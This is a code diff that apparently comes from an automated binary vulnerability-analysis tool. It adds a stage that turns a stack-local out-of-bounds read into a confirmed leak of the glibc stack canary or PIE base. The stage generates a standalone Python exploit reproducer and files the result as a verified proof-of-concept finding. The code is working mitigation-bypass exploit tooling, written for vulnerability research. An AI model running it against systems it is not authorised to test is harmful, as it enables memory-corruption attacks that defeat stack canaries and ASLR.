@@ -166,7 +166,9 @@ def chain_primitive_stage(ctx) -> dict:
             # Two shapes: a reclaimed-heap read (free a chunk, read its stale allocator metadata)
             # and an out-of-bounds array read steered onto a GOT slot. Each self-skips if it does
             # not fit; both recover a libc/PIE base (ASLR defeat) as a poc-backed L3.
-            got = _heap_uninit_disclose(ctx, target, dlead) or _oob_read_disclose_stage(ctx, target, dlead)
+            got = (_heap_uninit_disclose(ctx, target, dlead)
+                   or _oob_read_disclose_stage(ctx, target, dlead)
+                   or _stack_secret_disclose_stage(ctx, target, dlead))
             if got:
                 return got
         ctx.emit("chain.done", payload={"applicable": False,
@@ -2732,6 +2734,192 @@ def _file_heap_uninit_disclose_l3(ctx, target, lead, roles, hit, add_fields):
     ctx.progress(pct=100, msg=f"L3 CONFIRMED: reclaimed-heap read -> {base_kind} {base:#x}")
     return {"output_shas": [bundle_sha], "output_kind": "poc-bundle",
             "metrics": {"chained": True, "level": "L3", "vclass": "uninit_read", "disclosure": kind}}
+
+
+# --------------------------------------------- stack-local read -> canary / saved-return disclosure
+def _is_canary(x: int) -> bool:
+    """A glibc stack canary is [7 random bytes][0x00]: low byte NUL, the upper bytes populated
+    (so not a small 00-terminated integer), and NOT a canonical userspace pointer (so not a
+    00-terminated stack/heap/libc address). The run-to-run change in `_stack_secret_disclose` is
+    what makes it forgery-proof -- this only gives the shape."""
+    return (x & 0xFF) == 0 and (x >> 48) != 0 and not (0x550000000000 <= x < 0x800000000000)
+
+
+def _sweep_read(spawn, width, read_opt, model, lo, hi):
+    """Drive a read option across indices [lo, hi) in one process, returning {idx: disclosed int}.
+    Used to walk up a stack frame past a local buffer (saved RBP, the canary, the saved return)."""
+    from ..fuzz import menu
+    proc = spawn()
+    out = {}
+    try:
+        _pie_drain(proc)
+        for idx in range(lo, hi):
+            try:
+                proc.stdin.write(menu._scalar(read_opt.encode(), width)
+                                 + menu._scalar(str(idx).encode(), width))
+                proc.stdin.flush()
+            except (BrokenPipeError, OSError):
+                break
+            vals = _int_from_output(_pie_drain(proc)[0])
+            if vals:
+                out[idx] = vals[0]
+            if proc.poll() is not None:
+                break
+        return out
+    finally:
+        from ..dynamic import sandbox as _sb
+        _sb.kill_quietly(proc)
+
+
+def _stack_secret_disclose(ctx, spawn, width, opts, model, target_bytes):
+    """Steer a stack-local out-of-bounds READ up its own frame and DISCLOSE a stack secret:
+      * the stack CANARY -- confirmed by reading the SAME index in TWO fresh processes and requiring
+        a canary-shaped value that CHANGES (a per-process random; an echo cannot change, and an
+        ASLR pointer is canonical-range so it is excluded) -- the leak that bypasses the canary
+        mitigation for a stack overflow;
+      * the PIE image base -- from a disclosed saved RETURN address, via recover_pie_base.
+    Both forgery-proof + 0-false-confirmation. Returns a dict {read_opt, kind, idx, ...} or None.
+    Needs no known array base -- indices are relative to the frame's own buffer."""
+    from . import exploit
+    read_opts = [o for o in opts if o in model and model[o][:1] == ["idx"]]
+    if not read_opts:
+        return None
+    for read_opt in read_opts:
+        if ctx.should_cancel():
+            return None
+        a = _sweep_read(spawn, width, read_opt, model, 0, 48)
+        if not a:
+            continue
+        # PIE from a saved return (two corroborating image pointers, else a lone unambiguous one).
+        vals = list(a.values())
+        pie = exploit.recover_pie_base(vals, target_bytes) \
+            or exploit.recover_pie_base(vals, target_bytes, allow_single=True)
+        if pie:
+            anchor = next(((i, v - pie) for i, v in a.items()
+                           if (v - pie) in (set(exploit.elf_functions(target_bytes).values())
+                                            | set(exploit._call_return_sites(target_bytes)))), None)
+            if anchor:
+                ctx.progress(msg=f"stack read: option {read_opt} index {anchor[0]} disclosed a "
+                                 f"saved return -> PIE base {pie:#x}")
+                return {"read_opt": read_opt, "kind": "pie", "idx": anchor[0], "base": pie,
+                        "off": anchor[1]}
+        # Canary: the same index canary-shaped in two runs, and DIFFERENT (per-process random).
+        b = _sweep_read(spawn, width, read_opt, model, 0, 48)
+        for idx, v in a.items():
+            if _is_canary(v) and idx in b and _is_canary(b[idx]) and b[idx] != v:
+                ctx.progress(msg=f"stack read: option {read_opt} index {idx} disclosed the stack "
+                                 f"canary ({v:#x}; changed to {b[idx]:#x} next run)")
+                return {"read_opt": read_opt, "kind": "canary", "idx": idx, "canary": v}
+    return None
+
+
+def _stack_secret_disclose_stage(ctx, target, lead):
+    """Weaponize a CWE-125/457 read lead on a STACK-local buffer into a confirmed canary / PIE
+    disclosure (no global array needed -- the read walks its own frame)."""
+    target_bytes = ctx.content.path(target.sha256).read_bytes()
+    staged = _stage_and_crawl(ctx, target, exe_dir=None)
+    if not staged:
+        return None
+    wd, exe, opts, model, width = staged
+    try:
+        spawn = _pie_spawn(wd, exe)
+        hit = _stack_secret_disclose(ctx, spawn, width, opts, model, target_bytes)
+        if not hit:
+            return None
+        return _file_stack_secret_disclose_l3(ctx, target, lead, hit)
+    finally:
+        shutil.rmtree(wd, ignore_errors=True)
+
+
+def _stack_secret_repro_script(hit) -> bytes:
+    """A stdlib-only reproducer for a stack-local disclosure. For the PIE base, read the baked index
+    and subtract the image offset (page-aligned result). For the canary, read the baked index and
+    report the canary-shaped value (low byte NUL, upper bytes populated, non-pointer)."""
+    kind = hit["kind"]
+    off = hit.get("off", 0)
+    return (
+        "#!/usr/bin/env python3\n"
+        "# Stack-local info-disclosure reproducer (stdlib). Usage: python3 exploit.py ./target.bin\n"
+        "import subprocess, select, os, re, sys, time\n"
+        f"READ={hit['read_opt']!r}; IDX={hit['idx']}; KIND={kind!r}; OFF={off:#x}\n"
+        "EXE=sys.argv[1] if len(sys.argv)>1 else './target.bin'\n"
+        "p=subprocess.Popen([EXE],stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)\n"
+        "def drain(t=0.4):\n"
+        "  b=b''; end=time.time()+t\n"
+        "  while time.time()<end:\n"
+        "    r,_,_=select.select([p.stdout],[],[],0.2)\n"
+        "    if r:\n"
+        "      c=os.read(p.stdout.fileno(),4096)\n"
+        "      if not c: break\n"
+        "      b+=c\n"
+        "    elif p.poll() is not None: break\n"
+        "  return b\n"
+        "def send(s): p.stdin.write(s.encode() if isinstance(s,str) else s); p.stdin.flush()\n"
+        "drain()\n"
+        "send(READ+'\\n'); send(str(IDX)+'\\n'); out=drain()\n"
+        "vals=[int(m,16) for m in re.findall(rb'0x([0-9a-fA-F]{6,16})',out)]\n"
+        "vals+=[int(m)&0xffffffffffffffff for m in re.findall(rb'-?\\d{3,25}',out)]\n"
+        "if KIND=='pie':\n"
+        "  base=next((v-OFF for v in vals if (v-OFF)>0 and (v-OFF)%0x1000==0), None)\n"
+        "  print('[+] saved return -> PIE base %#x'%base if base else '[-] no base'); sys.exit(0 if base else 1)\n"
+        "else:\n"
+        "  can=next((v for v in vals if (v&0xff)==0 and (v>>48)!=0 and not (0x550000000000<=v<0x800000000000)), None)\n"
+        "  print('[+] stack canary leaked: %#x'%can if can else '[-] no canary'); sys.exit(0 if can else 1)\n"
+    ).encode()
+
+
+def _file_stack_secret_disclose_l3(ctx, target, lead, hit):
+    """File a confirmed stack-local disclosure (canary or PIE base) as an L3 verified PoC."""
+    import json as _json
+
+    from ...db.dao import FindingDAO, PocDAO
+    from . import bundle
+    kind = hit["kind"]
+    if kind == "pie":
+        secret, base_hex, note = "PIE image base", hex(hit["base"]), "the leak a PIE code-reuse chain consumes"
+        forge = "two corroborating image pointers (or one unambiguous saved-return page offset)"
+    else:
+        secret, base_hex = "stack canary", hex(hit["canary"])
+        note = "the secret that bypasses the stack-canary mitigation for a stack overflow"
+        forge = ("a canary-shaped value (NUL low byte, non-pointer) that CHANGED between two runs of "
+                 "the same input -- a per-process random an echo cannot reproduce")
+    script = _stack_secret_repro_script(hit)
+    input_sha = ctx.put_artifact("stack-secret-disclose-repro", data=script)
+    meta = {"target_sha256": target.sha256, "arch": target.arch, "level": "L3",
+            "exploit": f"{lead.cwe} stack-local read -> {secret} disclosure", "secret": secret,
+            "value": base_hex, "read_option": hit["read_opt"], "index": hit["idx"],
+            "tool_version": TOOL_VERSION}
+    data = bundle.build(ctx.content.path(target.sha256).read_bytes(), script, meta, b"",
+                        "stdin", [], None,
+                        primitive={"type": "stack_read", "target": secret, "index": hit["idx"],
+                                   "confirmed": True, "note": f"{secret} disclosure"})
+    bundle_sha = ctx.put_artifact("poc-bundle", data=data, meta={"level": "L3", "verified": True})
+    poc_id = PocDAO(ctx.conn).insert(target.id, target.case_id, level="L3", verified=True,
+                                     signal_name=None, input_sha=input_sha, bundle_sha=bundle_sha)
+    eff = (f"working information disclosure ({lead.cwe} stack-local out-of-bounds read -> {secret}): "
+           f"option {hit['read_opt']} read index {hit['idx']} of a stack buffer, walking up the "
+           f"frame to disclose the {secret} ({base_hex}). Forgery-proof: {forge}. {note}.")
+    fd = FindingDAO(ctx.conn)
+    cand = {"cwe": lead.cwe,
+            "title": f"Information disclosure (demonstrated): L3 stack read -> {secret}",
+            "severity": "high", "detector": "chain_primitive", "state": "poc-backed",
+            "confidence": 0.99, "authoritative": True, "title_only": True,
+            "dedup_key": f"chain:stack-secret-disclose:{kind}:{target.id}", "site_detail": secret,
+            "evidence": [{"channel": "effects", "detail": _json.dumps([{
+                "kind": "disclosure", "title": f"Stack-local read -> {secret}",
+                "status": "demonstrated", "detail": eff,
+                "proof": {"type": "bundle", "sha": bundle_sha, "input_sha": input_sha,
+                          "note": eff}}])}]}
+    fd.upsert(target.id, target.case_id, cand)
+    fid = fd.id_for_dedup(target.id, cand["dedup_key"])
+    if fid:
+        PocDAO(ctx.conn).set_finding(poc_id, fid)
+    _promote_lead(ctx, target, lead, level="L3", bundle_sha=bundle_sha, detail=eff)
+    ctx.emit("chain.done", payload={"applicable": True, "confirmed": True, "vclass": "stack_read",
+             "disclosure": secret, "value": base_hex, "bundle": bundle_sha})
+    ctx.progress(pct=100, msg=f"L3 CONFIRMED: stack read -> {secret} {base_hex}")
+    return {"output_shas": [bundle_sha], "output_kind": "poc-bundle",
+            "metrics": {"chained": True, "level": "L3", "vclass": "stack_read", "disclosure": kind}}
 
 
 # ------------------------------------------------------- CWE-125 out-of-bounds read -> disclosure
